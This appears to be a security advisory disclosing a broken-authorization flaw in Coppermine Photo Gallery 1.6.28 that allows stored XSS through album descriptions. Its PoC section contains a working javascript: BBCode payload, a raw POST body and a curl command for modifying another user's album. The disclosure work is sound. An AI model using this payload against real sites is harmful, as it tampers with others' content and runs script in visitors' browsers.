# Stored XSS in public album descriptions via unauthorized low-privilege album update

### Summary

A low-privilege authenticated user can use a hidden album update endpoint to modify the description of an album they do not own. Because album descriptions are later rendered with unsafe BBCode URL handling, this can be used to plant click-triggered stored XSS on public pages visible to anonymous users.

### Details

The normal UI does not allow such users to edit arbitrary albums (`modifyalb.php` around line 28), but the backend handler in `db_input.php` (`event=album_update`, around lines 360-419) only checks `user_is_allowed()`.

In `include/functions.inc.php` around line 5393, `user_is_allowed()` treats public albums with `uploads='YES'` as allowed, but does not verify that the current user owns the target album. As a result, a normal user can submit an update for another user's public upload-enabled album.

The impact becomes XSS because album descriptions are rendered on public pages through `bb_decode()` (for example `index.php` around line 1052), and `bb_decode()` in `include/functions.inc.php` (around lines 684 and 744) accepts arbitrary `[url=scheme://...]` BBCode schemes without a safe scheme allowlist.

This allows a low-privilege user to inject a malicious description such as:
`[url=javascript://a%0aalert(document.domain)]album-click[/url]`

which is then rendered into a clickable `javascript:` link on public pages.

### PoC

Verified on Coppermine Photo Gallery 1.6.28.

Prerequisites:

- a normal registered user account with upload rights
- a public album owned by another user (for example an admin-owned album) with `uploads='YES'`

No special encoding is required for this PoC. The payload is submitted directly as the album description.

Example payload:
`[url=javascript://a%0aalert(document.domain)]album-click[/url]`

Steps:

1. Log in as a normal registered user.
2. Obtain a valid `form_token` and `timestamp` from any authenticated page in the same session, for example:
   `http://localhost/profile.php?op=edit_profile`
3. Submit a direct POST request to:
   `http://localhost/db_input.php`

Example request body:

```text
event=album_update
aid=<TARGET_ALBUM_ID>
title=<keep existing title or set a new one>
category=0
description=[url=javascript://a%0aalert(document.domain)]album-click[/url]
keyword=
thumb=0
visibility=0
uploads=YES
comments=YES
votes=YES
form_token=<FORM_TOKEN>
timestamp=<TIMESTAMP>
```



Example `curl`:

```
curl -X POST "http://localhost/db_input.php" \
  -b "<authenticated cookies>" \
  --data-urlencode "event=album_update" \
  --data-urlencode "aid=<TARGET_ALBUM_ID>" \
  --data-urlencode "title=Updated title" \
  --data-urlencode "category=0" \
  --data-urlencode "description=[url=javascript://a%0aalert(document.domain)]album-click[/url]" \
  --data-urlencode "keyword=" \
  --data-urlencode "thumb=0" \
  --data-urlencode "visibility=0" \
  --data-urlencode "uploads=YES" \
  --data-urlencode "comments=YES" \
  --data-urlencode "votes=YES" \
  --data-urlencode "form_token=<FORM_TOKEN>" \
  --data-urlencode "timestamp=<TIMESTAMP>"
```



1. Visit a public page where the target album description is shown, for example:
   `http://localhost/index.php`
2. The malicious album description is rendered as a clickable link.
3. Clicking the rendered link executes JavaScript in the application origin.

In testing, a normal user successfully changed the title and description of an admin-owned public album; the database `owner` field remained unchanged, confirming unauthorized modification of another user's album.

### Impact

A normal low-privilege user can modify another user's public upload-enabled album metadata and plant stored XSS in album descriptions shown on public pages. This affects integrity through unauthorized content changes and can lead to execution of attacker-controlled JavaScript in the browser of anonymous visitors or authenticated users who click the malicious link.